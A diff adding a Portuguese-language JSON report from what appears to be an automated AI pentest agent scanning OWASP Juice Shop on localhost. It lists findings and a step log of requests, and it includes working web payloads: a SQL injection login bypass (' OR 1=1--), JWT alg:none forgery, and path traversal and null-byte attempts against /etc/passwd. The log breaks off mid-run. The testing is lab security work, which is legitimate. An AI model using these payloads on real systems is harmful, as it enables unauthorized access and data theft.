@@ -1,0 +1,762 @@
+{
+  "generatedAt": "2026-10-23T01:59:16.922Z",
+  "summary": "Limite de 40 iterações atingido.",
+  "finishedCleanly": false,
+  "totalIterations": 40,
+  "findingsSummary": {
+    "reactAgent": 0,
+    "abuseCases": 4,
+    "zapPassive": 169,
+    "total": 21
+  },
+  "findings": [
+    {
+      "title": "Acesso Não-Autorizado a Endpoints Administrativos",
+      "severity": "CRITICAL",
+      "category": "BLV_BROKEN_ACCESS_CONTROL",
+      "description": "Usuário comum (sem privilégios de admin) conseguiu acessar endpoints restritos à administração via chamada direta à API, sem qualquer verificação de role no servidor.",
+      "steps": [
+        "Autenticação realizada com conta customer@juice-sh.op",
+        "Acessou: http://localhost:3000/api/Users → HTTP 200, 21 registro(s) exposto(s) (listagem de todos os usuários)",
+        "Acessou: http://localhost:3000/api/Complaints → HTTP 200, 1 registro(s) exposto(s) (listagem de reclamações internas)"
+      ],
+      "evidence": "http://localhost:3000/api/Users → HTTP 200, 21 registro(s) exposto(s) (listagem de todos os usuários)\nhttp://localhost:3000/api/Complaints → HTTP 200, 1 registro(s) exposto(s) (listagem de reclamações internas)",
+      "discoveredAt": "2026-10-23T01:59:16.353Z"
+    },
+    {
+      "title": "Vulnerabilidade de Verificação de Assinatura JWT",
+      "severity": "CRITICAL",
+      "category": "JWT_SIGNATURE_BYPASS",
+      "description": "O servidor não verifica corretamente a assinatura do JWT. É possível forjar tokens com claims arbitrários (ex: role=admin) sem conhecer a chave secreta, resultando em escalada de privilégios completa.",
+      "steps": [
+        "JWT original decodificado: {\"status\":\"success\",\"data\":{\"id\":2,\"username\":\"\",\"email\":\"jim@juice-sh.op\",\"password\":\"e541ca7ecf72b8d1286474fc613e5e45\",\"role\":\"customer\",\"deluxeToke",
+        "Servidor aceitou JWT com alg:none (sem assinatura) — token forjado aceito",
+        "Servidor aceitou JWT com payload adulterado (assinatura inválida). Role retornado: undefined"
+      ],
+      "evidence": "alg:none response: {\"user\":{}}\nTampered token response: {\"user\":{}}",
+      "discoveredAt": "2026-10-23T01:59:16.389Z"
+    },
+    {
+      "title": "Exposição de Dados Sensíveis — Recursos Acessíveis Sem Autenticação",
+      "severity": "HIGH",
+      "category": "SENSITIVE_DATA_EXPOSURE",
+      "description": "3 recurso(s) confidencial(is) acessível(is) sem autenticação. A aplicação não protege adequadamente endpoints e arquivos internos, expondo configurações, documentos e dados de usuários.",
+      "steps": [
+        "http://localhost:3000/ftp/ → Diretório FTP interno acessível sem autenticação",
+        "http://localhost:3000/ftp/acquisitions.md → Documento confidencial de aquisições exposto via FTP",
+        "http://localhost:3000/rest/admin/application-configuration → Endpoint de configuração administrativa sem autenticação"
+      ],
+      "evidence": "[HIGH] http://localhost:3000/ftp/\nHTTP 200 — [\"quarantine\",\"acquisitions.md\",\"announcement_encrypted.md\",\"coupons_2013.md.bak\",\"eastere.gg\",\"encrypt.pyc\",\"incident-support.kdbx\",\"legal.md\",\"package-lock.json.bak\",\"package.json.bak\",\"suspicious_errors.yml\"]\n\n[HIGH] http://localhost:3000/ftp/acquisitions.md\nHTTP 200 — # Planned Acquisitions\n\n> This document is confidential! Do not distribute!\n\nOur company plans to acquire several competitors within the next year.\nThis will have a significant stock market impact as we will elaborate in\ndetail in the following paragraph:\n\nLorem ipsum dolor sit amet, consetetur sadi\n\n[HIGH] http://localhost:3000/rest/admin/application-configuration\nHTTP 200 — {\"config\":{\"server\":{\"port\":3000,\"basePath\":\"\",\"baseUrl\":\"http://localhost:3000\"},\"application\":{\"domain\":\"juice-sh.op\",\"name\":\"OWASP Juice Shop\",\"logo\":\"JuiceShop_Logo.png\",\"favicon\":\"favicon_js.ico\",\"theme\":\"bluegrey-lightgreen\",\"showVersionNumber\":true,\"showGitHubLinks\":true,\"localBackupEnabled\":",
+      "discoveredAt": "2026-10-23T01:59:16.442Z"
+    },
+    {
+      "title": "SQL Injection no Endpoint de Autenticação",
+      "severity": "CRITICAL",
+      "category": "SQLI_AUTH_BYPASS",
+      "description": "O endpoint de login /rest/user/login é vulnerável a SQL Injection. Payloads simples permitem autenticação sem credenciais válidas, comprometendo a conta de administrador ou qualquer outro usuário.",
+      "steps": [
+        "POST http://localhost:3000/rest/user/login com payloads SQLi",
+        "Payload: ' OR 1=1-- → HTTP 200, token JWT retornado"
+      ],
+      "evidence": "Email: ' OR 1=1--\nToken: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXN...",
+      "discoveredAt": "2026-10-23T01:59:16.580Z"
+    },
+    {
+      "title": "[ZAP] Cross-Domain Misconfiguration",
+      "severity": "INFO",
+      "category": "ZAP_PLUGIN_10098",
+      "description": "Web browser data loading may be possible, due to a Cross Origin Resource Sharing (CORS) misconfiguration on the web server. | CWE-264 | WASC-14",
+      "steps": [
+        "URL afetada: http://juice-shop:3000/chunk-24EZLZ4I.js",
+        "Confiança: Medium/3",
+        "Solução: Ensure that sensitive data is not available in an unauthenticated manner (using IP address white-listing, for instance).\nConfigure the \"Access-Control-Allow-Origin\" HTTP header to a more restrictive s"
+      ],
+      "evidence": "Access-Control-Allow-Origin: *",
+      "discoveredAt": "2026-10-23T01:59:16.913Z"
+    },
+    {
+      "title": "[ZAP] X-Content-Type-Options Header Missing",
+      "severity": "INFO",
+      "category": "ZAP_PLUGIN_10021",
+      "description": "The Anti-MIME-Sniffing header X-Content-Type-Options was not set to 'nosniff'. This allows older versions of Internet Explorer and Chrome to perform MIME-sniffing on the response body, potentially causing the response body to be interpreted and displayed as a content type other than the declared content type. Current (early 2014) and legacy versions of Firefox will use the declared content type (if one is set), rather than performing MIME-sniffing. | CWE-693 | WASC-15",
+      "steps": [
+        "URL afetada: http://juice-shop:3000/socket.io/?EIO=4&transport=polling&t=Q5cUNFb",
+        "Confiança: Medium/3",
+        "Solução: Ensure that the application/web server sets the Content-Type header appropriately, and that it sets the X-Content-Type-Options header to 'nosniff' for all web pages.\nIf possible, ensure that the end u"
+      ],
+      "evidence": "http://juice-shop:3000/socket.io/?EIO=4&transport=polling&t=Q5cUNFb",
+      "discoveredAt": "2026-10-23T01:59:16.913Z"
+    },
+    {
+      "title": "[ZAP] Vulnerable JS Library",
+      "severity": "INFO",
+      "category": "ZAP_PLUGIN_10003",
+      "description": "The identified library appears to be vulnerable. | CWE-1395 | WASC--1",
+      "steps": [
+        "URL afetada: http://juice-shop:3000/chunk-LHKS7QUN.js",
+        "Confiança: Medium/3",
+        "Solução: Upgrade to the latest version of the affected library."
+      ],
+      "evidence": "[\"ng-version\",\"20.3.18\"]",
+      "discoveredAt": "2026-10-23T01:59:16.913Z"
+    },
+    {
+      "title": "[ZAP] Content Security Policy (CSP) Header Not Set",
+      "severity": "INFO",
+      "category": "ZAP_PLUGIN_10038",
+      "description": "Content Security Policy (CSP) is an added layer of security that helps to detect and mitigate certain types of attacks, including Cross Site Scripting (XSS) and data injection attacks. These attacks are used for everything from data theft to site defacement or distribution of malware. CSP provides a set of standard HTTP headers that allow website owners to declare approved sources of content that browsers should be allowed to load on that page — covered types are JavaScript, CSS, HTML frames, fonts, images and embeddable objects such as Java applets, ActiveX, audio and video files. | CWE-693 | WASC-15",
+      "steps": [
+        "URL afetada: http://juice-shop:3000/",
+        "Confiança: High/3",
+        "Solução: Ensure that your web server, application server, load balancer, etc. is configured to set the Content-Security-Policy header."
+      ],
+      "evidence": "http://juice-shop:3000/",
+      "discoveredAt": "2026-10-23T01:59:16.914Z"
+    },
+    {
+      "title": "[ZAP] Modern Web Application",
+      "severity": "INFO",
+      "category": "ZAP_PLUGIN_10109",
+      "description": "The application appears to be a modern web application. If you need to explore it automatically then the Client Spider may well be more effective than the standard one. | CWE--1 | WASC--1",
+      "steps": [
+        "URL afetada: http://juice-shop:3000/",
+        "Confiança: Medium/3",
+        "Solução: This is an informational alert and so no changes are required."
+      ],
+      "evidence": "<script>\n    window.addEventListener(\"load\", function(){\n      window.cookieconsent.initialise({\n        \"palette\": {\n          \"popup\": { \"background\": \"var(--theme-primary)\", \"text\": \"var(--theme-text)\" },\n          \"button\": { \"background\": \"var(--theme-accent)\", \"text\": \"var(--theme-text)\" }\n        },\n        \"theme\": \"classic\",\n        \"position\": \"bottom-right\",\n        \"content\": { \"message\": \"This website uses fruit cookies to ensure you get the juiciest tracking experience.\", \"dismiss\": \"Me want it!\", \"link\": \"But me wait!\", \"href\": \"https://www.youtube.com/watch?v=9PnbKL3wuH4\" }\n      })});\n  </script>",
+      "discoveredAt": "2026-10-23T01:59:16.914Z"
+    },
+    {
+      "title": "[ZAP] Timestamp Disclosure - Unix",
+      "severity": "INFO",
+      "category": "ZAP_PLUGIN_10096",
+      "description": "A timestamp was disclosed by the application/web server. - Unix | CWE-497 | WASC-13",
+      "steps": [
+        "URL afetada: http://juice-shop:3000/",
+        "Confiança: Low/3",
+        "Solução: Manually confirm that the timestamp data is not sensitive, and that the data cannot be aggregated to disclose exploitable patterns."
+      ],
+      "evidence": "1650485437",
+      "discoveredAt": "2026-10-23T01:59:16.914Z"
+    },
+    {
+      "title": "[ZAP] Private IP Disclosure",
+      "severity": "INFO",
+      "category": "ZAP_PLUGIN_2",
+      "description": "A private IP (such as 10.x.x.x, 172.x.x.x, 192.168.x.x) or an Amazon EC2 private hostname (for example, ip-10-0-56-78) has been found in the HTTP response body. This information might be helpful for further attacks targeting internal systems. | CWE-497 | WASC-13",
+      "steps": [
+        "URL afetada: http://juice-shop:3000/rest/admin/application-configuration",
+        "Confiança: Medium/3",
+        "Solução: Remove the private IP address from the HTTP response body. For comments, use JSP/ASP/PHP comment instead of HTML/JavaScript comment which can be seen by client browsers."
+      ],
+      "evidence": "192.168.99.100:3000",
+      "discoveredAt": "2026-10-23T01:59:16.914Z"
+    },
+    {
+      "title": "[ZAP] Session ID in URL Rewrite",
+      "severity": "INFO",
+      "category": "ZAP_PLUGIN_3",
+      "description": "URL rewrite is used to track user session ID. The session ID may be disclosed via cross-site referer header. In addition, the session ID might be stored in browser history or server logs. | CWE-598 | WASC-13",
+      "steps": [
+        "URL afetada: http://juice-shop:3000/socket.io/?EIO=4&transport=websocket&sid=4Eqk_sQipbIHlD4PAAAA",
+        "Confiança: High/3",
+        "Solução: For secure content, put session ID in a cookie. To be even more secure consider using a combination of cookie and URL rewrite."
+      ],
+      "evidence": "4Eqk_sQipbIHlD4PAAAA",
+      "discoveredAt": "2026-10-23T01:59:16.914Z"
+    },
+    {
+      "title": "[ZAP] Missing Anti-clickjacking Header",
+      "severity": "INFO",
+      "category": "ZAP_PLUGIN_10020",
+      "description": "The response does not protect against 'ClickJacking' attacks. It should include either Content-Security-Policy with 'frame-ancestors' directive or X-Frame-Options. | CWE-1021 | WASC-15",
+      "steps": [
+        "URL afetada: http://juice-shop:3000/socket.io/?EIO=4&transport=polling&t=Q5cUNIx&sid=4Eqk_sQipbIHlD4PAAAA",
+        "Confiança: Medium/3",
+        "Solução: Modern Web browsers support the Content-Security-Policy and X-Frame-Options HTTP headers. Ensure one of them is set on all web pages returned by your site/app.\nIf you expect the page to be framed only"
+      ],
+      "evidence": "http://juice-shop:3000/socket.io/?EIO=4&transport=polling&t=Q5cUNIx&sid=4Eqk_sQipbIHlD4PAAAA",
+      "discoveredAt": "2026-10-23T01:59:16.914Z"
+    },
+    {
+      "title": "[ZAP] Re-examine Cache-control Directives",
+      "severity": "INFO",
+      "category": "ZAP_PLUGIN_10015",
+      "description": "The cache-control header has not been set properly or is missing, allowing the browser and proxies to cache content. For static assets like css, js, or image files this might be intended, however, the resources should be reviewed to ensure that no sensitive content will be cached. | CWE-525 | WASC-13",
+      "steps": [
+        "URL afetada: https://content-autofill.googleapis.com/v1/pages/ChRDaHJvbWUvMTI3LjAuNjUzMy44OBIZCU2To9RYYIBJEgUN1dhOWiHO_KDJ4-frlQ==?alt=proto",
+        "Confiança: Low/3",
+        "Solução: For secure content, ensure the cache-control HTTP header is set with \"no-cache, no-store, must-revalidate\". If an asset should be cached consider setting the directives \"public, max-age, immutable\"."
+      ],
+      "evidence": "private,max-age=604800",
+      "discoveredAt": "2026-10-23T01:59:16.914Z"
+    },
+    {
+      "title": "[ZAP] Strict-Transport-Security Header Not Set",
+      "severity": "INFO",
+      "category": "ZAP_PLUGIN_10035",
+      "description": "HTTP Strict Transport Security (HSTS) is a web security policy mechanism whereby a web server declares that complying user agents (such as a web browser) are to interact with it using only secure HTTPS connections (i.e. HTTP layered over TLS/SSL). HSTS is an IETF standards track protocol and is specified in RFC 6797. | CWE-319 | WASC-15",
+      "steps": [
+        "URL afetada: https://content-autofill.googleapis.com/v1/pages/ChRDaHJvbWUvMTI3LjAuNjUzMy44OBIZCU2To9RYYIBJEgUN1dhOWiHO_KDJ4-frlQ==?alt=proto",
+        "Confiança: High/3",
+        "Solução: Ensure that your web server, application server, load balancer, etc. is configured to enforce Strict-Transport-Security."
+      ],
+      "evidence": "https://content-autofill.googleapis.com/v1/pages/ChRDaHJvbWUvMTI3LjAuNjUzMy44OBIZCU2To9RYYIBJEgUN1dhOWiHO_KDJ4-frlQ==?alt=proto",
+      "discoveredAt": "2026-10-23T01:59:16.914Z"
+    },
+    {
+      "title": "[ZAP] Session Management Response Identified",
+      "severity": "INFO",
+      "category": "ZAP_PLUGIN_10112",
+      "description": "The given response has been identified as containing a session management token. The 'Other Info' field contains a set of header tokens that can be used in the Header Based Session Management Method. If the request is in a context which has a Session Management Method set to \"Auto-Detect\" then this rule will change the session management to use the tokens identified. | CWE--1 | WASC--1",
+      "steps": [
+        "URL afetada: http://juice-shop:3000/rest/continue-code",
+        "Confiança: High/3",
+        "Solução: This is an informational alert rather than a vulnerability and so there is nothing to fix."
+      ],
+      "evidence": "continueCode",
+      "discoveredAt": "2026-10-23T01:59:16.914Z"
+    },
+    {
+      "title": "[ZAP] Application Error Disclosure",
+      "severity": "INFO",
+      "category": "ZAP_PLUGIN_90022",
+      "description": "This page contains an error/warning message that may disclose sensitive information like the location of the file that produced the unhandled exception. This information can be used to launch further attacks against the web application. The alert could be a false positive if the error message is found inside a documentation page. | CWE-550 | WASC-13",
+      "steps": [
+        "URL afetada: http://juice-shop:3000/rest/order-history",
+        "Confiança: Medium/3",
+        "Solução: Review the source code of this page. Implement custom error pages. Consider implementing a mechanism to provide a unique error reference/identifier to the client (browser) while logging the details on"
+      ],
+      "evidence": "HTTP/1.1 500 Internal Server Error",
+      "discoveredAt": "2026-10-23T01:59:16.914Z"
+    },
+    {
+      "title": "[ZAP] Information Disclosure - Debug Error Messages",
+      "severity": "INFO",
+      "category": "ZAP_PLUGIN_10023",
+      "description": "The response appeared to contain common error messages returned by platforms such as ASP.NET, and Web-servers such as IIS and Apache. You can configure the list of common debug messages. | CWE-1295 | WASC-13",
+      "steps": [
+        "URL afetada: http://juice-shop:3000/api/Hints/",
+        "Confiança: Medium/3",
+        "Solução: Disable debugging messages before pushing to production."
+      ],
+      "evidence": "Internal Server Error",
+      "discoveredAt": "2026-10-23T01:59:16.914Z"
+    },
+    {
+      "title": "[ZAP] Authentication Request Identified",
+      "severity": "INFO",
+      "category": "ZAP_PLUGIN_10111",
+      "description": "The given request has been identified as an authentication request. The 'Other Info' field contains a set of key=value lines which identify any relevant fields. If the request is in a context which has an Authentication Method set to \"Auto-Detect\" then this rule will change the authentication to match the request identified. | CWE--1 | WASC--1",
+      "steps": [
+        "URL afetada: http://juice-shop:3000/rest/user/login",
+        "Confiança: High/3",
+        "Solução: This is an informational alert rather than a vulnerability and so there is nothing to fix."
+      ],
+      "evidence": "password",
+      "discoveredAt": "2026-10-23T01:59:16.914Z"
+    },
+    {
+      "title": "[ZAP] CSP: Failure to Define Directive with No Fallback",
+      "severity": "INFO",
+      "category": "ZAP_PLUGIN_10055",
+      "description": "The Content Security Policy fails to define one of the directives that has no fallback. Missing/excluding them is the same as allowing anything. | CWE-693 | WASC-15",
+      "steps": [
+        "URL afetada: http://juice-shop:3000/api-docs",
+        "Confiança: High/3",
+        "Solução: Ensure that your web server, application server, load balancer, etc. is properly configured to set the Content-Security-Policy header."
+      ],
+      "evidence": "default-src 'none'",
+      "discoveredAt": "2026-10-23T01:59:16.914Z"
+    },
+    {
+      "title": "[ZAP] Information Disclosure - Sensitive Information in URL",
+      "severity": "INFO",
+      "category": "ZAP_PLUGIN_10024",
+      "description": "The request appeared to contain sensitive information leaked in the URL. This can violate PCI and most organizational compliance policies. You can configure the list of strings for this check to add or remove values specific to your environment. | CWE-598 | WASC-13",
+      "steps": [
+        "URL afetada: http://juice-shop:3000/api/Users/?filter%5Bfields%5D%5Bpassword%5D=true",
+        "Confiança: Medium/3",
+        "Solução: Do not pass sensitive information in URIs."
+      ],
+      "evidence": "filter[fields][password]",
+      "discoveredAt": "2026-10-23T01:59:16.914Z"
+    }
+  ],
+  "steps": [
+    {
+      "iteration": 1,
+      "thought": "Iniciando reconhecimento ativo na SPA. Vou navegar para a raiz, ler a página e extrair tokens/cookies para mapear o ambiente Angular e identificar bundles JS e endpoints.",
+      "action": {
+        "action": "navigate",
+        "url": "http://localhost:3000"
+      },
+      "observation": "Navegou para http://juice-shop:3000/. Título: \"OWASP Juice Shop\". URL atual: http://juice-shop:3000/#/",
+      "timestamp": "2026-10-23T01:57:30.307Z"
+    },
+    {
+      "iteration": 2,
+      "thought": "Navegação confirmou a SPA Angular. Preciso inspecionar o DOM e recursos carregados para identificar scripts, formulários e rotas ocultas.",
+      "action": {
+        "action": "read_page"
+      },
+      "observation": "URL: http://juice-shop:3000/#/\nTítulo: OWASP Juice Shop\nConteúdo:\nThis website uses fruit cookies to ensure you get the juiciest tracking experience. But me wait!\nMe want it!\nmenu\nOWASP Juice Shop\nclose\nsearch\nlanguage\nAll Products\nApple Juice (1000ml)\n1.99¤\nApple Pomace\n0.89¤\nBanana Juice (1000ml)\n1.99¤\nOnly 1 left\nBest Juice Shop Salesman Artwork\n5000¤\nCarrot Juice (1000ml)\n2.99¤\nEggfruit Juice (500ml)\n8.99¤\nFruit Press\n89.99¤\nGreen Smoothie\n1.99¤\nOnly 1 left\nJuice Shop \"Permafrost\" 2020 Editi",
+      "timestamp": "2026-10-23T01:57:35.579Z"
+    },
+    {
+      "iteration": 3,
+      "thought": "A página inicial confirma que é o OWASP Juice Shop, uma aplicação intencionalmente vulnerável. Vou extrair tokens e identificar scripts carregados para obter o bundle JS.",
+      "action": {
+        "action": "extract_tokens"
+      },
+      "observation": "{\n  \"jwt\": null,\n  \"bearerToken\": null,\n  \"cookies\": {\n    \"language\": \"en\"\n  },\n  \"currentUrl\": \"http://juice-shop:3000/#/\"\n}",
+      "timestamp": "2026-10-23T01:57:37.704Z"
+    },
+    {
+      "iteration": 4,
+      "thought": "Não há token no localStorage neste ponto. Preciso listar os scripts carregados; para isso, vou usar make_request para buscar o HTML da raiz e inspecionar tags <script src>.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://localhost:3000/"
+      },
+      "observation": "HTTP 200 GET http://juice-shop:3000/\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"accept-ranges\":\"bytes\",\"cache-control\":\"public, max-age=0\",\"last-modified\":\"Fri, 23 Oct 2026 01:55:32 GMT\",\"etag\":\"W/\\\"124fa-1a16678737f\\\"\",\"content-type\":\"text/html; charset=UTF-8\",\"content-length\":\"75002\",\"vary\":\"Accept-Encoding\",\"date\":\"Fri, 23 Oct 2026 01:57:39 GMT\",\"connectio",
+      "timestamp": "2026-10-23T01:57:39.379Z"
+    },
+    {
+      "iteration": 5,
+      "thought": "O HTML da raiz traz headers e referências a scripts. Preciso encontrar os <script src> do bundle principal. Vou buscar por padrões de nome de arquivo JS no body.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://localhost:3000/main.js"
+      },
+      "observation": "HTTP 200 GET http://juice-shop:3000/main.js\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"accept-ranges\":\"bytes\",\"cache-control\":\"public, max-age=0\",\"last-modified\":\"Tue, 14 Apr 2026 06:50:11 GMT\",\"etag\":\"W/\\\"14cdab-19d8ac134b8\\\"\",\"content-type\":\"application/javascript; charset=UTF-8\",\"content-length\":\"1363371\",\"vary\":\"Accept-Encoding\",\"date\":\"Fri, 23 Oct 2026 0",
+      "timestamp": "2026-10-23T01:57:41.216Z"
+    },
+    {
+      "iteration": 6,
+      "thought": "O bundle principal é main.js (1.3MB). Vou procurar no bundle por rotas, endpoints e chaves sensíveis usando buscas por strings comuns. Também testo arquivos padrão e documentação de API.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://localhost:3000/polyfills.js"
+      },
+      "observation": "HTTP 200 GET http://juice-shop:3000/polyfills.js\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"accept-ranges\":\"bytes\",\"cache-control\":\"public, max-age=0\",\"last-modified\":\"Tue, 14 Apr 2026 06:50:11 GMT\",\"etag\":\"W/\\\"8719-19d8ac134b8\\\"\",\"content-type\":\"application/javascript; charset=UTF-8\",\"content-length\":\"34585\",\"vary\":\"Accept-Encoding\",\"date\":\"Fri, 23 Oct 2026 ",
+      "timestamp": "2026-10-23T01:57:43.150Z"
+    },
+    {
+      "iteration": 7,
+      "thought": "Vou testar a existência de source map do main.js, documentação de API e arquivos padrão. Também buscar no bundle por rotas e strings sensíveis. Como o conteúdo é minificado, vou fazer requisições com query para grep remoto (não disponível) ou simplesmente baixar e inspecionar partes. Em vez disso, uso make_request para endpoints padrão.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://localhost:3000/main.js.map"
+      },
+      "observation": "HTTP 200 GET http://juice-shop:3000/main.js.map\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"accept-ranges\":\"bytes\",\"cache-control\":\"public, max-age=0\",\"last-modified\":\"Fri, 23 Oct 2026 01:55:32 GMT\",\"etag\":\"W/\\\"124fa-1a16678737f\\\"\",\"content-type\":\"text/html; charset=UTF-8\",\"content-length\":\"75002\",\"vary\":\"Accept-Encoding\",\"date\":\"Fri, 23 Oct 2026 01:57:45 GMT\"",
+      "timestamp": "2026-10-23T01:57:45.330Z"
+    },
+    {
+      "iteration": 8,
+      "thought": "O main.js.map retornou o index.html (fallback do SPA), então source map não está exposto diretamente. Vou testar arquivos padrão e documentação de API, e obter headers de endpoints conhecidos.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://localhost:3000/robots.txt"
+      },
+      "observation": "HTTP 200 GET http://juice-shop:3000/robots.txt\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"text/plain; charset=utf-8\",\"content-length\":\"28\",\"etag\":\"W/\\\"1c-8HgF6mNyhsSFK0pascC9uB0wjX0\\\"\",\"vary\":\"Accept-Encoding\",\"date\":\"Fri, 23 Oct 2026 01:57:48 GMT\",\"connection\":\"keep-alive\",\"keep-alive\":\"timeout=5\"}\nBody:\nUser-agent: *\nDisallow: /ftp",
+      "timestamp": "2026-10-23T01:57:48.462Z"
+    },
+    {
+      "iteration": 9,
+      "thought": "robots.txt revela rota /ftp — potencial vetor de LFI/arquivos. Vou explorar isso e testar outros arquivos padrão: sitemap, security.txt, .well-known, package.json, .env, .git.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://localhost:3000/ftp"
+      },
+      "observation": "HTTP 200 GET http://juice-shop:3000/ftp\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"application/json; charset=utf-8\",\"content-length\":\"211\",\"vary\":\"Accept-Encoding\",\"date\":\"Fri, 23 Oct 2026 01:57:49 GMT\",\"connection\":\"keep-alive\",\"keep-alive\":\"timeout=5\"}\nBody:\n[\n  \"quarantine\",\n  \"acquisitions.md\",\n  \"announcement_encrypted.md\",\n  \"coupons_2013",
+      "timestamp": "2026-10-23T01:57:49.939Z"
+    },
+    {
+      "iteration": 10,
+      "thought": "/ftp lista arquivos, incluindo backups .bak e .kdbx (keepass), além de eastere.gg. Isso é Sensitive Data Exposure. Vou baixar alguns arquivos sensíveis e testar path traversal nesse endpoint.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://localhost:3000/ftp/package.json.bak"
+      },
+      "observation": "HTTP 403 GET http://juice-shop:3000/ftp/package.json.bak\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"application/json; charset=utf-8\",\"vary\":\"Accept-Encoding\",\"date\":\"Fri, 23 Oct 2026 01:57:51 GMT\",\"connection\":\"keep-alive\",\"keep-alive\":\"timeout=5\",\"content-length\":\"927\"}\nBody:\n{\n  \"error\": {\n    \"message\": \"Only .md and .pdf files are allowed!\"",
+      "timestamp": "2026-10-23T01:57:51.649Z"
+    },
+    {
+      "iteration": 11,
+      "thought": "Stack trace vaza caminho do servidor (/juice-shop/build/routes/fileServer.js) e uso do Express. Filtro restringe a .md/.pdf, mas pode haver bypass com null byte ou path traversal. Vou testar um arquivo .md permitido e depois path traversal.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://localhost:3000/ftp/acquisitions.md"
+      },
+      "observation": "HTTP 200 GET http://juice-shop:3000/ftp/acquisitions.md\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"accept-ranges\":\"bytes\",\"cache-control\":\"public, max-age=0\",\"last-modified\":\"Tue, 14 Apr 2026 06:47:22 GMT\",\"etag\":\"W/\\\"38d-19d8abea090\\\"\",\"content-type\":\"text/markdown; charset=UTF-8\",\"content-length\":\"909\",\"vary\":\"Accept-Encoding\",\"date\":\"Fri, 23 Oct 2026 01:57",
+      "timestamp": "2026-10-23T01:57:53.372Z"
+    },
+    {
+      "iteration": 12,
+      "thought": "Arquivo .md acessível. Vou tentar path traversal para ler arquivos fora da pasta ftp usando extensão .md/pdf ou null byte. Testar `/ftp/../../../etc/passwd.md` e `/ftp/package.json.bak%00.md`.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://localhost:3000/ftp/..%2f..%2f..%2fetc%2fpasswd.md"
+      },
+      "observation": "HTTP 403 GET http://juice-shop:3000/ftp/..%2f..%2f..%2fetc%2fpasswd.md\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"application/json; charset=utf-8\",\"vary\":\"Accept-Encoding\",\"date\":\"Fri, 23 Oct 2026 01:57:55 GMT\",\"connection\":\"keep-alive\",\"keep-alive\":\"timeout=5\",\"content-length\":\"1878\"}\nBody:\n{\n  \"error\": {\n    \"message\": \"Forbidden\",\n    \"stack",
+      "timestamp": "2026-10-23T01:57:55.324Z"
+    },
+    {
+      "iteration": 13,
+      "thought": "Path traversal foi bloqueado pelo serve-index. Vou tentar null byte bypass no filename para ler package.json.bak, e testar extensões duplas.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://localhost:3000/ftp/package.json.bak%00.md"
+      },
+      "observation": "HTTP 400 GET http://juice-shop:3000/ftp/package.json.bak%00.md\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"application/json; charset=utf-8\",\"vary\":\"Accept-Encoding\",\"date\":\"Fri, 23 Oct 2026 01:57:56 GMT\",\"connection\":\"keep-alive\",\"keep-alive\":\"timeout=5\",\"content-length\":\"1883\"}\nBody:\n{\n  \"error\": {\n    \"message\": \"Bad Request\",\n    \"stack\": \"Ba",
+      "timestamp": "2026-10-23T01:57:56.977Z"
+    },
+    {
+      "iteration": 14,
+      "thought": "Null byte não funcionou. Vou testar bypass de extensão usando case, múltiplas extensões ou encoded dot. Também vou inspecionar /ftp/legal.md e /ftp/coupons_2013.md.bak — o segundo pode ter cupons.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://localhost:3000/ftp/coupons_2013.md.bak"
+      },
